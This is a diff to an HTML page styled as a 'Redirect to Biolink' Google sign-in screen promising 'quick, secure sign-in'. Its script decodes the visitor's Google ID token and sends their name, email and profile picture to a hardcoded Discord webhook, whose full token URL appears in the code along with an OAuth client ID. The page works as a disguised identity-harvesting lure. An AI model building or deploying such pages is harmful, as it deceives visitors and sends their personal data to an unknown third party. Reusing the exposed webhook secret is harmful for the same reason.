@@ -308,61 +308,96 @@ function fadeMatrixEffect(duration = 1500) {
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sign in with Google</title>
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in</title>
+<script src="https://accounts.google.com/gsi/client" async defer></script>
+<style>
+  :root { --bg:#0f1720; --card:#0b1220; --accent:#1f6feb; --btn-h:40px; }
+  html,body{height:100%;margin:0;background:var(--bg);font-family:Inter,Segoe UI,system-ui,sans-serif}
+  .wrap{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px}
+  h1{color:#fff;font-size:18px;margin:0 0 12px;text-transform:uppercase;letter-spacing:1px;opacity:.9}
+  .card{background:linear-gradient(180deg,rgba(255,255,255,.02),transparent);padding:18px 22px;border-radius:14px;box-shadow:0 6px 30px rgba(2,6,23,.6);display:flex;flex-direction:column;align-items:center}
+  /* smaller, modern custom Google button (always English text) */
+  .google-btn{
+    height:var(--btn-h);display:inline-flex;align-items:center;gap:10px;padding:0 14px;border-radius:10px;background:#fff;border:none;cursor:pointer;font-weight:600;
+    box-shadow:0 4px 12px rgba(2,6,23,.25);transform:scale(.9);transition:transform .12s ease,box-shadow .12s ease;
+  }
+  .google-btn:hover{transform:scale(.94);box-shadow:0 8px 22px rgba(2,6,23,.32)}
+  .g-icon{width:20px;height:20px;display:inline-block}
+  .subtitle{color:#9aa4b2;font-size:13px;margin-top:8px}
+</style>
 </head>
-<body style="display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;">
+<body>
+  <div class="wrap">
+    <h1>Redirect to Biolink</h1>
 
-  <h2>Sign in with Google</h2>
+    <div class="card" style="margin-top:10px;">
+      <button id="googleSign" class="google-btn" aria-label="Sign in with Google">
+        <span class="g-icon">
+          <!-- small Google SVG -->
+          <svg viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg" width="20" height="20" aria-hidden="true">
+            <path fill="#4285f4" d="M533.5 278.4c0-17.6-1.6-34.5-4.6-50.9H272v96.4h146.9c-6.3 34.1-25.1 62.9-53.6 82.2v68.3h86.6c50.7-46.7 81.6-115.6 81.6-195.9z"/>
+            <path fill="#34a853" d="M272 544.3c72.6 0 133.6-24.1 178-65.4l-86.6-68.3c-24.1 16.2-55 25.7-91.4 25.7-70.2 0-129.8-47.3-151.1-110.8H34.1v69.7C78.3 485.9 167.5 544.3 272 544.3z"/>
+            <path fill="#fbbc05" d="M120.9 325.5c-5.8-17.6-9.1-36.4-9.1-55.5s3.3-37.9 9.1-55.5V144.8H34.1C12.3 189 0 235.3 0 270s12.3 81 34.1 125.2l86.8-69.7z"/>
+            <path fill="#ea4335" d="M272 108.9c39.5 0 75 13.6 103 40.6l77.3-77.3C406.8 24.3 346.6 0 272 0 167.5 0 78.3 58.4 34.1 144.8l86.8 69.7C142.2 156.2 201.8 108.9 272 108.9z"/>
+          </svg>
+        </span>
+        <span>Sign in with Google</span>
+      </button>
 
-  <!-- Google Sign-In button -->
-  <div id="g_id_onload"
-       data-client_id="349325109312-hsp1oof27gue7ihgmf89i1l34jvsjicn.apps.googleusercontent.com"
-       data-context="signin"
-       data-ux_mode="popup"
-       data-callback="handleCredentialResponse"
-       data-auto_select="true">
+      <div class="subtitle">Quick, secure sign-in</div>
+    </div>
   </div>
 
-  <div class="g_id_signin"
-       data-type="standard"
-       data-shape="rectangular"
-       data-theme="outline"
-       data-text="signin_with"
-       data-size="large"
-       data-logo_alignment="left">
-  </div>
+<script>
+  // Replace placeholders
+  const CLIENT_ID = "349325109312-hsp1oof27gue7ihgmf89i1l34jvsjicn.apps.googleusercontent.com";
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1406804822748827688/7GxqFVIxZTQI0b15UV6TLIeEw14JWqf1DAE1vOeNX7iXjq-Du3x8uPTOw2cqiFZxxacQ";
 
-  <script>
-  // Handle Google login
-  async function handleCredentialResponse(response) {
-      const data = parseJwt(response.credential);
+  // init GIS
+  window.onload = () => {
+    google.accounts.id.initialize({
+      client_id: CLIENT_ID,
+      callback: handleCredentialResponse
+    });
+    // disable auto-select so popup always appears
+    google.accounts.id.disableAutoSelect();
+  };
 
-      // Send login info to Discord webhook
-      await fetch("https://discord.com/api/webhooks/1406804822748827688/7GxqFVIxZTQI0b15UV6TLIeEw14JWqf1DAE1vOeNX7iXjq-Du3x8uPTOw2cqiFZxxacQ", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-              content: `📢 Google Login:\n**Name:** ${data.name}\n**Email:** ${data.email}\n**Picture:** ${data.picture}`
-          })
+  // button triggers the official prompt (popup)
+  document.getElementById('googleSign').addEventListener('click', () => {
+    google.accounts.id.prompt(); // shows One Tap or popup depending on context
+  });
+
+  async function handleCredentialResponse(resp) {
+    if (!resp || !resp.credential) return;
+    const data = parseJwt(resp.credential);
+    // send to Discord webhook (replace with your webhook URL)
+    try {
+      await fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `Google login — Name: ${data.name}\nEmail: ${data.email}`,
+          username: "Login Bot",
+          avatar_url: data.picture
+        })
       });
-
-      alert("Login info sent to Discord!");
+      alert("Login info sent.");
+    } catch(e) {
+      console.error(e);
+      alert("Failed sending webhook.");
+    }
   }
 
-  // Decode Google JWT token
-  function parseJwt (token) {
-      var base64Url = token.split('.')[1];
-      var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-      var jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
-          return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-      }).join(''));
-
-      return JSON.parse(jsonPayload);
+  function parseJwt(token) {
+    try {
+      const b = token.split('.')[1].replace(/-/g,'+').replace(/_/g,'/');
+      return JSON.parse(decodeURIComponent(atob(b).split('').map(c=>'%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join('')));
+    } catch { return {}; }
   }
-  </script>
+</script>
 </body>
 </html>
 
